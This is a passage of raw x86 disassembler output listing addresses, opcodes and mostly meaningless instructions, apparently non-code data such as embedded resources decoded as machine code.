  40994d:	fdiv   QWORD PTR [edx-0x4d231001]
  409953:	(bad)  
  409954:	out    dx,eax
  409955:	(bad)  [eax-0x50251001]
  40995b:	push   eax
  40995d:	fld    TBYTE PTR [ebp-0x52240f01]
  409963:	push   eax
  409965:	fld    TBYTE PTR [ebp-0x52240f01]
  40996b:	push   ecx
  40996d:	fld    TBYTE PTR [ebp-0x52240f01]
  409973:	push   eax
  409975:	fld    TBYTE PTR [ebp-0x52240f01]
  40997b:	push   eax
  40997d:	fisubr DWORD PTR [edi+edi*8-0x542511]
  409984:	icebp  
  409985:	fnsave [esi-0x59311d01]
  40998b:	jmp    DWORD PTR [edx+0xc42476]
  409991:	add    BYTE PTR [eax],al
  409993:	sbb    eax,DWORD PTR [eax]
  409995:	add    BYTE PTR [eax],al
  409997:	pop    es
	...
  4099b0:	xor    al,0xa2
  4099b2:	int    0xff
  4099b4:	or     eax,0x24ffeeb0
  4099b9:	mov    ebx,0xc446fff1
  4099be:	out    dx,al
  4099bf:	call   FWORD PTR [esi-0x31]
  4099c2:	lock push DWORD PTR [ebp-0x27]
  4099c6:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  4099ce:	idiv   edi
  4099d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099d1:	in     eax,dx
  4099d2:	idiv   bh
  4099d4:	mov    esp,fs
  4099d6:	hlt    
  4099d7:	call   FWORD PTR [edx-0x32]
  4099da:	icebp  
  4099db:	push   DWORD PTR ds:0x2effebbd
  4099e1:	mov    bh,0xe5
  4099e3:	jmp    FWORD PTR [ebx+esi*4]
  4099e6:	loope  0x4099e7
  4099e8:	cs mov al,0xdd
  4099eb:	(bad)  
  4099ec:	cmp    BYTE PTR [edi-0x51bb0027],ch
  4099f2:	into   
  4099f3:	jmp    FWORD PTR [ebp-0x2100d381]
  4099f9:	leave  
  4099fa:	mov    ds:0xcbe4f1ff,al
  4099ff:	push   ebx
  409a01:	in     eax,0xca
  409a03:	push   edx
  409a05:	in     eax,0xca
  409a07:	push   edx
  409a09:	in     eax,0xcb
  409a0b:	push   edx
  409a0d:	in     eax,0xcb
  409a0f:	push   ebx
  409a11:	in     eax,0xcb
  409a13:	push   esp
  409a15:	out    0xca,al
  409a17:	push   esp
  409a19:	in     eax,0xca
  409a1b:	push   esp
  409a1d:	in     eax,0xca
  409a1f:	push   esp
  409a21:	out    0xca,al
  409a23:	push   esp
  409a25:	out    0xca,al
  409a27:	push   esp
  409a29:	out    0xca,al
  409a2b:	push   esp
  409a2d:	out    0xca,al
  409a2f:	push   esp
  409a31:	out    0xca,al
  409a33:	push   esp
  409a35:	out    0xca,al
  409a37:	push   esp
  409a39:	out    0xca,al
  409a3b:	push   esp
  409a3d:	out    0xca,al
  409a3f:	push   esp
  409a41:	out    0xca,al
  409a43:	push   ecx
  409a45:	loopne 0x409a08
  409a47:	dec    esp
  409a49:	scas   al,BYTE PTR es:[edi]
  409a4a:	jbe    0x409a4b
  409a4c:	xchg   esp,eax
  409a4d:	imul   esp,DWORD PTR [eax],0xffffff83
  409a50:	add    BYTE PTR [eax],al
  409a52:	add    BYTE PTR ds:0x2000000,cl
	...
  409a70:	xor    eax,0xdffcda3
  409a75:	mov    cl,0xee
  409a77:	jmp    DWORD PTR [ebx+edi*4]
  409a7a:	icebp  
  409a7b:	inc    DWORD PTR [esi-0x3c]
  409a7e:	out    dx,eax
  409a7f:	call   FWORD PTR [esi-0x31]
  409a82:	icebp  
  409a83:	push   DWORD PTR [ebp-0x27]
  409a86:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  409a8e:	idiv   edi
  409a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a91:	in     eax,dx
  409a92:	idiv   bh
  409a94:	mov    esp,fs
  409a96:	hlt    
  409a97:	call   FWORD PTR [edx-0x32]
  409a9a:	icebp  
  409a9b:	push   DWORD PTR [ecx]
  409a9d:	mov    ebp,0xb41affee
  409aa2:	in     al,dx
  409aa3:	dec    DWORD PTR [ecx]
  409aa5:	lods   al,BYTE PTR ds:[esi]
  409aa6:	jmp    0xff:0xe8a701ff
  409aad:	mov    ds:0xa102ffe5,eax
  409ab2:	loopne 0x409ab3
  409ab4:	sub    al,0x95
  409ab6:	scas   eax,DWORD PTR es:[edi]
  409ab7:	push   DWORD PTR [ecx-0x7a]
  409aba:	arpl   di,di
  409abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409abd:	jl     0x409ae8
  409abf:	jmp    FWORD PTR [edx-0x5500da85]
  409ac5:	jnp    0x409aec
  409ac7:	jmp    FWORD PTR [edx-0x5500da85]
  409acd:	jnp    0x409af4
  409acf:	jmp    FWORD PTR [edx-0x5500da85]
  409ad5:	jnp    0x409afc
  409ad7:	jmp    FWORD PTR [edx-0x5500da85]
  409add:	jnp    0x409b04
  409adf:	jmp    FWORD PTR [edx-0x5500da85]
  409ae5:	jnp    0x409b0c
  409ae7:	jmp    FWORD PTR [edx-0x5500da85]
  409aed:	jnp    0x409b14
  409aef:	jmp    FWORD PTR [edx-0x5500da85]
  409af5:	jnp    0x409b1c
  409af7:	jmp    FWORD PTR [edx-0x5500da85]
  409afd:	jnp    0x409b24
  409aff:	jmp    FWORD PTR [edx-0x5600da85]
  409b05:	jnp    0x409b2c
  409b07:	hlt    
  409b08:	mov    ds:0x5a902376,eax
  409b0d:	inc    ecx
  409b0e:	adc    al,0x11
  409b10:	add    BYTE PTR [eax],al
  409b12:	add    BYTE PTR [ebx],al
	...
  409b30:	xor    eax,0xeffcda3
  409b35:	mov    al,0xed
  409b37:	jmp    DWORD PTR [ebx+edi*4]
  409b3a:	lock inc DWORD PTR [ebp-0x3b]
  409b3e:	out    dx,eax
  409b3f:	call   FWORD PTR [esi-0x31]
  409b42:	icebp  
  409b43:	push   DWORD PTR [ebp-0x28]
  409b46:	repz call DWORD PTR [esi+eiz*8-0xf55000b]
  409b4e:	idiv   edi
  409b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b51:	in     eax,dx
  409b52:	idiv   bh
  409b54:	(bad)  
  409b55:	in     al,0xf4
  409b57:	call   FWORD PTR [ebx-0x32]
  409b5a:	icebp  
  409b5b:	push   DWORD PTR [ecx]
  409b5d:	mov    ebp,0xb41affee
  409b62:	in     al,dx
  409b63:	dec    DWORD PTR [ecx]
  409b65:	lods   al,BYTE PTR ds:[esi]
  409b66:	jmp    0xff:0xe8a701ff
  409b6d:	mov    ds:0xa102ffe5,eax
  409b72:	loopne 0x409b73
  409b74:	add    ebx,DWORD PTR [edi-0x61fd0022]
  409b7a:	fdivp  st(7),st
  409b7c:	add    BYTE PTR [eax+0x721dffe2],ah
  409b82:	popf   
  409b83:	inc    DWORD PTR [eax]
	...
  409bed:	add    BYTE PTR [eax],al
  409bef:	add    BYTE PTR [edx+eiz*4],dh
  409bf2:	int3   
  409bf3:	dec    DWORD PTR ds:0x24ffedb0
  409bf9:	mov    ebx,0xc545fff0
  409bfe:	out    dx,eax
  409bff:	call   FWORD PTR [ebp-0x31]
  409c02:	icebp  
  409c03:	push   DWORD PTR [ecx+ebx*8-0xd]
  409c07:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  409c0e:	idiv   edi
  409c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c11:	in     eax,dx
  409c12:	idiv   bh
  409c14:	mov    esp,fs
  409c16:	hlt    
  409c17:	call   FWORD PTR [edx-0x32]
  409c1a:	icebp  
  409c1b:	push   DWORD PTR [ecx]
  409c1d:	mov    ebp,0xb41affee
  409c22:	in     al,dx
  409c23:	dec    DWORD PTR [ecx]
  409c25:	lods   al,BYTE PTR ds:[esi]
  409c26:	jmp    0xff:0xe8a701ff
  409c2d:	mov    ds:0xa102ffe5,eax
  409c32:	loopne 0x409c33
  409c34:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409c3a:	fdivp  st(7),st
  409c3c:	add    BYTE PTR [eax+0x741fffe2],ah
  409c42:	sahf   
  409c43:	inc    DWORD PTR [eax]
	...
  409cad:	add    BYTE PTR [eax],al
  409caf:	add    BYTE PTR [ebx],dh
  409cb1:	mov    ds:0xb00dffcd,eax
  409cb6:	in     eax,dx
  409cb7:	jmp    DWORD PTR [ebx+edi*4]
  409cba:	lock inc DWORD PTR [esi-0x3b]
  409cbe:	out    dx,eax
  409cbf:	call   FWORD PTR [esi-0x31]
  409cc2:	icebp  
  409cc3:	push   DWORD PTR [ebp-0x28]
  409cc6:	bnd call DWORD PTR [esi+eiz*8-0xf55000b]
  409cce:	idiv   edi
  409cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cd1:	in     eax,dx
  409cd2:	idiv   bh
  409cd4:	mov    esp,fs
  409cd6:	hlt    
  409cd7:	call   FWORD PTR [edx-0x32]
  409cda:	icebp  
  409cdb:	push   DWORD PTR [ecx]
  409cdd:	mov    ebp,0xb41affee
  409ce2:	in     al,dx
  409ce3:	dec    DWORD PTR [ecx]
  409ce5:	lods   al,BYTE PTR ds:[esi]
  409ce6:	jmp    0xff:0xe8a701ff
  409ced:	mov    ds:0xa102ffe5,eax
  409cf2:	loopne 0x409cf3
  409cf4:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409cfa:	fdivp  st(7),st
  409cfc:	add    BYTE PTR [eax+0x7721ffe1],ah
  409d02:	mov    ds:0xff,al
	...
  409d6f:	add    BYTE PTR [ebx],dh
  409d71:	mov    ds:0xb00dffce,eax
  409d76:	in     eax,dx
  409d77:	jmp    DWORD PTR [ebx+edi*4]
  409d7a:	lock inc DWORD PTR [esi-0x3b]
  409d7e:	out    dx,eax
  409d7f:	call   FWORD PTR [esi-0x31]
  409d82:	icebp  
  409d83:	push   DWORD PTR [ebp-0x28]
  409d86:	bnd call DWORD PTR [esi+eiz*8-0xf55000b]
  409d8e:	idiv   edi
  409d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d91:	in     eax,dx
  409d92:	idiv   bh
  409d94:	mov    esp,fs
  409d96:	hlt    
  409d97:	call   FWORD PTR [edx-0x32]
  409d9a:	icebp  
  409d9b:	push   DWORD PTR [ecx]
  409d9d:	mov    ebp,0xb41affee
  409da2:	in     al,dx
  409da3:	dec    DWORD PTR [ecx]
  409da5:	lods   al,BYTE PTR ds:[esi]
  409da6:	jmp    0xff:0xe8a701ff
  409dad:	mov    ds:0xa102ffe5,eax
  409db2:	loopne 0x409db3
  409db4:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409dba:	fdivp  st(7),st
  409dbc:	add    BYTE PTR [esi+0x7b24ffe0],bl
  409dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dc3:	inc    DWORD PTR [eax]
	...
  409e2d:	add    BYTE PTR [eax],al
  409e2f:	add    BYTE PTR [ebx+eiz*4],dh
  409e32:	iret   
  409e33:	dec    DWORD PTR ds:0x24ffeeb0
  409e39:	mov    ebx,0xc545fff1
  409e3e:	out    dx,al
  409e3f:	call   FWORD PTR [ebp-0x31]
  409e42:	lock push DWORD PTR [ecx+ebx*8-0xe]
  409e47:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  409e4e:	idiv   edi
  409e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e51:	in     eax,dx
  409e52:	idiv   bh
  409e54:	(bad)  
  409e55:	in     al,0xf4
  409e57:	call   FWORD PTR [edx-0x32]
  409e5a:	icebp  
  409e5b:	push   DWORD PTR [eax]
  409e5d:	mov    ebp,0xb41affee
  409e62:	in     al,dx
  409e63:	dec    DWORD PTR [ecx]
  409e65:	lods   al,BYTE PTR ds:[esi]
  409e66:	jmp    0xff:0xe8a601ff
  409e6d:	mov    ds:0xa102ffe5,eax
  409e72:	loopne 0x409e73
  409e74:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409e7a:	fdivp  st(7),st
  409e7c:	add    BYTE PTR [esi+0x7e26ffe0],bl
  409e82:	test   eax,0xff
	...
  409eef:	add    BYTE PTR ds:0xdffcea3,dh
  409ef5:	scas   eax,DWORD PTR es:[edi]
  409ef6:	in     al,dx
  409ef7:	jmp    DWORD PTR [ebx+edi*4]
  409efa:	lock inc DWORD PTR [ebp-0x3b]
  409efe:	out    dx,eax
  409eff:	call   FWORD PTR [ebp-0x31]
  409f02:	icebp  
  409f03:	push   DWORD PTR [ecx+ebx*8-0xd]
  409f07:	call   DWORD PTR [edi+eiz*8-0xf55000b]
  409f0e:	idiv   edi
  409f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f11:	in     eax,dx
  409f12:	idiv   bh
  409f14:	mov    esp,fs
  409f16:	hlt    
  409f17:	call   FWORD PTR [edx-0x32]
  409f1a:	icebp  
  409f1b:	push   DWORD PTR [eax]
  409f1d:	mov    ebp,0xb419ffee
  409f22:	in     al,dx
  409f23:	dec    DWORD PTR [ecx]
  409f25:	lods   al,BYTE PTR ds:[esi]
  409f26:	jmp    0xff:0xe8a701ff
  409f2d:	mov    ds:0xa102ffe5,eax
  409f32:	loopne 0x409f33
  409f34:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409f3a:	fdivp  st(7),st
  409f3c:	add    BYTE PTR [esi+0x7f26ffe0],bl
  409f42:	test   eax,0xff
	...
  409faf:	add    BYTE PTR ds:0xeffcfa5,dh
  409fb5:	mov    al,0xee
  409fb7:	jmp    DWORD PTR [ebx]
  409fb9:	mov    ebx,0xc545fff1
  409fbe:	out    dx,al
  409fbf:	call   FWORD PTR [esi-0x31]
  409fc2:	lock push DWORD PTR [ebp-0x27]
  409fc6:	bnd call DWORD PTR [edi+eiz*8-0xf55000b]
  409fce:	idiv   edi
  409fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd1:	in     eax,dx
  409fd2:	idiv   bh
  409fd4:	mov    esp,fs
  409fd6:	hlt    
  409fd7:	call   FWORD PTR [edx-0x32]
  409fda:	icebp  
  409fdb:	push   DWORD PTR [ecx]
  409fdd:	mov    esp,0xb31bffee
  409fe2:	in     al,dx
  409fe3:	dec    DWORD PTR [edx]
  409fe5:	lods   al,BYTE PTR ds:[esi]
  409fe6:	jmp    0xff:0xe7a702ff
  409fed:	mov    ds:0xa102ffe4,eax
  409ff2:	(bad)  
  409ff4:	add    ebx,DWORD PTR [edi-0x60fc0022]
  409ffa:	fdivp  st(7),st
  409ffc:	add    BYTE PTR [esi+0x7f26ffe0],bl
  40a002:	test   eax,0xff
	...
  40a06f:	add    BYTE PTR [esp+eiz*4],dh
  40a072:	iret   
  40a073:	dec    DWORD PTR [esi]
  40a075:	mov    cl,0xee
  40a077:	jmp    DWORD PTR [ebx]
  40a079:	mov    esp,0xc645fff1
  40a07e:	out    dx,al
  40a07f:	call   FWORD PTR [esi-0x31]
  40a082:	lock push DWORD PTR [ebp-0x28]
  40a086:	bnd call DWORD PTR [esi+eiz*8-0xf55000c]
  40a08e:	idiv   edi
  40a090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a091:	in     eax,dx
  40a092:	idiv   edi
  40a094:	(bad)  
  40a095:	in     al,0xf5
  40a097:	call   FWORD PTR [ebx-0x32]
  40a09a:	icebp  
  40a09b:	push   DWORD PTR [eax]
  40a09d:	mov    esp,0xb31affee
  40a0a2:	in     al,dx
  40a0a3:	dec    DWORD PTR [edx]
  40a0a5:	lods   al,BYTE PTR ds:[esi]
  40a0a6:	jmp    0xff:0xe8a702ff
  40a0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ae:	in     eax,0xff
  40a0b0:	add    DWORD PTR [edi-0x60fd0021],ebx
  40a0b6:	fdivp  st(7),st
  40a0b8:	add    al,0x9f
  40a0ba:	fdivp  st(7),st
  40a0bc:	add    BYTE PTR [ebp-0x7dd80021],bl
  40a0c2:	lods   eax,DWORD PTR ds:[esi]
  40a0c3:	inc    DWORD PTR [eax]
	...
  40a12d:	add    BYTE PTR [eax],al
  40a12f:	add    BYTE PTR [ebx],dh
  40a131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a132:	iret   
  40a133:	dec    DWORD PTR ds:0x23ffedb0
  40a139:	mov    esp,0xc644fff1
  40a13e:	out    dx,al
  40a13f:	call   FWORD PTR [ebp-0x31]
  40a142:	lock push DWORD PTR [eax+ebx*8-0xe]
  40a147:	call   DWORD PTR [esi+eiz*8-0xf55000c]
  40a14e:	idiv   edi
  40a150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a151:	in     eax,dx
  40a152:	idiv   edi
  40a154:	(bad)  
  40a155:	in     al,0xf6
  40a157:	call   FWORD PTR [ebx-0x32]
  40a15a:	icebp  
  40a15b:	push   DWORD PTR [eax]
  40a15d:	mov    esp,0xb319ffee
  40a162:	in     al,dx
  40a163:	dec    DWORD PTR [ecx]
  40a165:	lods   al,BYTE PTR ds:[esi]
  40a166:	jmp    0xff:0xe8a701ff
  40a16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a16e:	in     eax,0xff
  40a170:	add    ah,BYTE PTR [eax-0x60fc0020]
  40a176:	fdivp  st(7),st
  40a178:	add    ebx,DWORD PTR [edi-0x62ff0022]
  40a17e:	(bad)  
  40a180:	sub    BYTE PTR [ebp+0xffb0],al
	...
  40a1ee:	add    BYTE PTR [eax],al
  40a1f0:	xor    al,0xa4
  40a1f2:	iret   
  40a1f3:	dec    DWORD PTR [esi]
  40a1f5:	scas   eax,DWORD PTR es:[edi]
  40a1f6:	in     al,dx
  40a1f7:	jmp    DWORD PTR [edx]
  40a1f9:	mov    ebx,0xc442fff0
  40a1fe:	out    dx,eax
  40a1ff:	call   FWORD PTR [ecx-0x33]
  40a202:	lock push DWORD PTR [eax-0x2a]
  40a206:	icebp  
  40a207:	call   DWORD PTR [eax-0x57000a1b]
  40a20d:	out    dx,eax
  40a20e:	idiv   edi
  40a210:	mov    eax,ds:0x88fff5ec
  40a215:	loop   0x40a20a
  40a217:	call   DWORD PTR [eax-0x36]
  40a21a:	lock jmp DWORD PTR [eax+edi*4]
  40a21e:	in     eax,dx
  40a21f:	dec    DWORD PTR ds:0xffebaf
  40a225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a226:	jmp    0xff:0xe6a300ff
  40a22d:	mov    ds:0xa103ffe4,al
  40a232:	loopne 0x40a233
  40a234:	add    ebx,DWORD PTR [edi-0x61fc0022]
  40a23a:	fdivp  st(7),st
  40a23c:	add    BYTE PTR [ebx-0x77d60021],bl
  40a242:	mov    ah,0xff
	...
  40a2b0:	das    
  40a2b1:	mov    ds:0xad08ffce,al
  40a2b6:	in     eax,dx
  40a2b7:	call   FWORD PTR [eax+edi*4]
  40a2ba:	icebp  
  40a2bb:	inc    DWORD PTR [ebx-0x3c]
  40a2be:	out    dx,al
  40a2bf:	jmp    DWORD PTR [ecx-0x30]
  40a2c2:	icebp  
  40a2c3:	(bad)  
  40a2c4:	jge    0x40a2a2
  40a2c6:	repz call FWORD PTR [edx+ebp*8-0xc4f0009]
  40a2ce:	stc    
  40a2cf:	jmp    FWORD PTR [ebx-0x66000810]
  40a2d5:	jmp    0xd8b2a2d0
  40a2da:	hlt    
  40a2db:	dec    DWORD PTR [ecx+ecx*8-0xf]
  40a2df:	push   DWORD PTR [edx]
  40a2e1:	mov    esi,0xb51dffef
  40a2e6:	in     al,dx
  40a2e7:	dec    DWORD PTR [ecx+ebp*4]
  40a2ea:	jmp    0xe4e1a3ee
  40a2ef:	inc    DWORD PTR [eax]
  40a2f1:	call   0xffdd:0x9900ffde
  40a2f8:	add    DWORD PTR [esi-0x64ff0023],ebx
  40a2fe:	(bad)  
  40a300:	sub    cl,BYTE PTR [edx+0xffb6]
	...
  40a36e:	add    BYTE PTR [eax],al
  40a370:	sub    esp,DWORD PTR [ecx-0x4ef00031]
  40a376:	out    dx,al
  40a377:	push   DWORD PTR ds:0x6dfff3c2
  40a37d:	aad    0xf2
  40a37f:	call   FWORD PTR [eax+ebp*8-0xe4d0008]
  40a386:	cli    
  40a387:	(bad)  
  40a388:	mov    ebx,0xbffffbf4
  40a38d:	idiv   bl
  40a38f:	(bad)  
  40a390:	mov    esi,0xbcfffcf6
  40a395:	hlt    
  40a396:	sti    
  40a397:	push   DWORD PTR [esi-0x5300040e]
  40a39d:	out    dx,al
  40a39e:	cli    
  40a39f:	call   FWORD PTR [edi-0x6e000718]
  40a3a5:	loop   0x40a39d
  40a3a7:	(bad)  
  40a3a8:	jge    0x40a384
  40a3aa:	hlt    
  40a3ab:	call   FWORD PTR [ecx-0x36]
  40a3ae:	out    dx,eax
  40a3af:	jmp    DWORD PTR [edi]
  40a3b1:	scas   eax,DWORD PTR es:[edi]
  40a3b2:	out    0xff,al
  40a3b4:	sbb    esp,DWORD PTR [edi-0x5df90020]
  40a3ba:	loopne 0x40a3bb
  40a3bc:	add    BYTE PTR [eax+eiz*8-0x4973d301],bl
  40a3c3:	inc    DWORD PTR [eax]
	...
  40a42d:	add    BYTE PTR [eax],al
  40a42f:	add    BYTE PTR [edx-0x54],al
  40a432:	sar    edi,cl
  40a434:	dec    edi
  40a435:	int3   
  40a436:	cmc    
  40a437:	dec    DWORD PTR [edi-0x44000319]
  40a43d:	hlt    
  40a43e:	sti    
  40a43f:	dec    ecx
  40a441:	stc    
  40a442:	std    
  40a443:	dec    ebx
  40a445:	stc    
  40a446:	std    
  40a447:	inc    esi
  40a449:	idiv   esp
  40a44b:	inc    ebx
  40a44d:	cmc    
  40a44e:	sti    
  40a44f:	inc    eax
  40a451:	cmc    
  40a452:	sti    
  40a453:	inc    eax
  40a455:	cmc    
  40a456:	cli    
  40a457:	inc    eax
  40a459:	hlt    
  40a45a:	sti    
  40a45b:	inc    ecx
  40a45d:	cmc    
  40a45e:	sti    
  40a45f:	inc    ecx
  40a461:	cmc    
  40a462:	cli    
  40a463:	inc    edx
  40a465:	cmc    
  40a466:	cli    
  40a467:	inc    ebp
  40a469:	idiv   bl
  40a46b:	(bad)  
  40a46c:	mov    ebx,0x9bfffaf3
  40a471:	in     eax,0xf6
  40a473:	dec    DWORD PTR [esi+ebx*8-0x39b3000c]
  40a47a:	icebp  
  40a47b:	inc    DWORD PTR [eax]
  40a47d:	mov    eax,ds:0x8c26ffe6
  40a482:	mov    eax,0xff
	...
  40a4ef:	add    BYTE PTR [ecx-0x3d002138],al
  40a4f5:	cli    
  40a4f6:	(bad)  
  40a4f7:	call   eax
  40a4f9:	(bad)  
  40a4fa:	(bad)  
  40a4fb:	call   ebp
  40a4fd:	(bad)  
  40a4fe:	(bad)  
  40a4ff:	dec    esi
  40a501:	cli    
  40a502:	(bad)  
  40a503:	dec    esp
  40a505:	cli    
  40a506:	(bad)  
  40a507:	dec    ebx
  40a509:	cli    
  40a50a:	std    
  40a50b:	dec    ecx
  40a50d:	stc    
  40a50e:	std    
  40a50f:	inc    edi
  40a511:	clc    
  40a512:	std    
  40a513:	inc    esi
  40a515:	idiv   esp
  40a517:	inc    ebp
  40a519:	idiv   ebp
  40a51b:	inc    esp
  40a51d:	idiv   esp
  40a51f:	inc    edx
  40a521:	cmc    
  40a522:	sti    
  40a523:	(bad)  
  40a524:	mov    edi,0xbefffbf4
  40a529:	hlt    
  40a52a:	sti    
  40a52b:	(bad)  
  40a52c:	mov    esi,0xc3fffbf4
  40a531:	idiv   bl
  40a533:	inc    edx
  40a535:	idiv   esp
  40a537:	jmp    FWORD PTR [edi+0x6dfffff3]
  40a53d:	retf   0xffe8
  40a540:	dec    esi
  40a541:	cdq    
  40a542:	mov    ecx,0xff
	...
  40a5af:	add    BYTE PTR [edi-0x3f],bh
  40a5b2:	ficomp DWORD PTR [esi-0x161f4d]
  40a5b8:	iret   
  40a5b9:	hlt    
  40a5ba:	idiv   bh
  40a5bc:	xlat   BYTE PTR ds:[ebx]
  40a5bd:	(bad)  
  40a5be:	(bad)  
  40a5bf:	call   esi
  40a5c1:	(bad)  
  40a5c2:	(bad)  
  40a5c3:	call   ebx
  40a5c5:	(bad)  
  40a5c6:	(bad)  
  40a5c7:	call   ecx
  40a5c9:	(bad)  
  40a5ca:	(bad)  
  40a5cb:	dec    esi
  40a5cd:	cld    
  40a5ce:	(bad)  
  40a5cf:	dec    esi
  40a5d1:	sti    
  40a5d2:	(bad)  
  40a5d3:	dec    esp
  40a5d5:	cli    
  40a5d6:	(bad)  
  40a5d7:	dec    ebx
  40a5d9:	cli    
  40a5da:	(bad)  
  40a5db:	dec    ecx
  40a5dd:	stc    
  40a5de:	std    
  40a5df:	dec    eax
  40a5e1:	clc    
  40a5e2:	cld    
  40a5e3:	inc    esi
  40a5e5:	idiv   esp
  40a5e7:	inc    esi
  40a5e9:	clc    
  40a5ea:	cld    
  40a5eb:	inc    esp
  40a5ed:	idiv   ebp
  40a5ef:	inc    ebx
  40a5f1:	idiv   ebp
  40a5f3:	inc    esi
  40a5f5:	stc    
  40a5f6:	(bad)  
  40a5f7:	inc    ebp
  40a5f9:	cmc    
  40a5fa:	clc    
  40a5fb:	call   FWORD PTR [ecx+0x61ffd4c7]
  40a601:	cdq    
  40a602:	mov    bl,0xa1
	...
  40a670:	jno    0x40a62b
  40a672:	(bad)  
  40a673:	adc    BYTE PTR [eax-0x6c5c243b],cl
  40a679:	int    0xe0
  40a67b:	fldenv [eax-0x65001c2b]
  40a681:	shl    ecx,cl
  40a683:	call   DWORD PTR [edx+edx*8-0x1143401f]
  40a68a:	hlt    
  40a68b:	fst    st(5)
  40a68d:	(bad)  
  40a68e:	(bad)  
  40a68f:	call   esi
  40a691:	(bad)  
  40a692:	(bad)  
  40a693:	call   ebp
  40a695:	(bad)  
  40a696:	(bad)  
  40a697:	(bad)  
  40a698:	fdivr  st,st(7)
  40a69a:	(bad)  
  40a69b:	call   edi
  40a69d:	(bad)  
  40a69e:	(bad)  
  40a69f:	call   esi
  40a6a1:	(bad)  
  40a6a2:	(bad)  
  40a6a3:	inc    edx
  40a6a5:	repz clc 
  40a6a7:	jmp    FWORD PTR [ebp-0x6400101c]
  40a6ad:	xlat   BYTE PTR ds:[ebx]
  40a6ae:	in     eax,0xff
  40a6b0:	xchg   esp,eax
  40a6b1:	into   
  40a6b2:	(bad)  
  40a6b4:	mov    al,bh
  40a6b6:	(bad)  
  40a6b8:	jl     0x40a675
  40a6ba:	sar    edi,1
  40a6bc:	je     0x40a669
  40a6be:	ret    
  40a6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c0:	pop    ebp
  40a6c1:	xchg   edi,eax
  40a6c2:	mov    dl,0x12
	...
  40a734:	xchg   esi,eax
  40a736:	fst    QWORD PTR [ecx]
  40a738:	test   ah,al
  40a73a:	fsub   QWORD PTR [eax]
  40a73c:	mov    esp,eax
  40a73e:	fadd   QWORD PTR [ecx+eax*4-0x40]
  40a742:	(bad)  [ebx-0x46213572]
  40a748:	mov    cs,ecx
  40a74a:	(bad)  
  40a74c:	mov    cs,ebx
  40a74e:	(bad)  
  40a750:	mov    cs,edx
  40a752:	fdivp  st(7),st
  40a754:	(bad)  
  40a755:	leave  
  40a756:	(bad)  
  40a758:	(bad)  
  40a759:	leave  
  40a75a:	(bad)  
  40a75c:	mov    ecx,eax
  40a75e:	(bad)  
  40a760:	mov    ebp,eax
  40a762:	(bad)  
  40a764:	xchg   ebx,eax
  40a766:	fcos   
  40a768:	test   cl,al
  40a76a:	xlat   BYTE PTR ds:[ebx]
  40a76b:	inc    DWORD PTR [edx+0x6bd9d5c0]
  40a771:	mov    dl,0xcd
  40a773:	mov    esp,DWORD PTR [esi-0x53]
  40a776:	leave  
  40a777:	inc    ebx
  40a778:	push   0xffffffad
  40a77a:	enter  0x6f20,0xa8
  40a77e:	ret    0x12
	...
  40aa15:	add    BYTE PTR [eax],al
  40aa17:	add    bh,bh
  40aa19:	(bad)  
  40aa1a:	(bad)  
  40aa1b:	(bad)  
  40aa1c:	(bad)  
  40aa1d:	inc    DWORD PTR [eax]
  40aa1f:	add    bh,bh
  40aa21:	(bad)  
  40aa22:	(bad)  
  40aa23:	(bad)  
  40aa24:	(bad)  
  40aa25:	inc    DWORD PTR [eax]
  40aa27:	add    bh,bh
  40aa29:	(bad)  
  40aa2a:	(bad)  
  40aa2b:	(bad)  
  40aa2c:	(bad)  
  40aa2d:	inc    DWORD PTR [eax]
  40aa2f:	add    bh,bh
  40aa31:	(bad)  
  40aa32:	(bad)  
  40aa33:	(bad)  
  40aa34:	(bad)  
  40aa35:	inc    DWORD PTR [eax]
  40aa37:	add    bh,bh
  40aa39:	jmp    eax
  40aa3b:	add    BYTE PTR [eax],al
  40aa3d:	pop    ds
  40aa3e:	add    BYTE PTR [eax],al
  40aa40:	(bad)  
  40aa41:	jmp    eax
  40aa43:	add    BYTE PTR [eax],al
  40aa45:	sldt   WORD PTR [eax]
  40aa48:	(bad)  
  40aa49:	jmp    eax
  40aa4b:	add    BYTE PTR [eax],al
  40aa4d:	pop    es
  40aa4e:	add    BYTE PTR [eax],al
  40aa50:	(bad)  
  40aa51:	jmp    eax
  40aa53:	add    BYTE PTR [eax],al
  40aa55:	pop    es
  40aa56:	add    BYTE PTR [eax],al
  40aa58:	(bad)  
  40aa59:	inc    DWORD PTR [eax]
  40aa5b:	add    BYTE PTR [eax],al
  40aa5d:	pop    es
  40aa5e:	add    BYTE PTR [eax],al
  40aa60:	(bad)  
  40aa61:	inc    DWORD PTR [eax]
  40aa63:	add    BYTE PTR [eax],al
  40aa65:	pop    es
  40aa66:	add    BYTE PTR [eax],al
  40aa68:	(bad)  
  40aa69:	inc    DWORD PTR [eax]
  40aa6b:	add    BYTE PTR [eax],al
  40aa6d:	pop    es
  40aa6e:	add    BYTE PTR [eax],al
  40aa70:	(bad)  
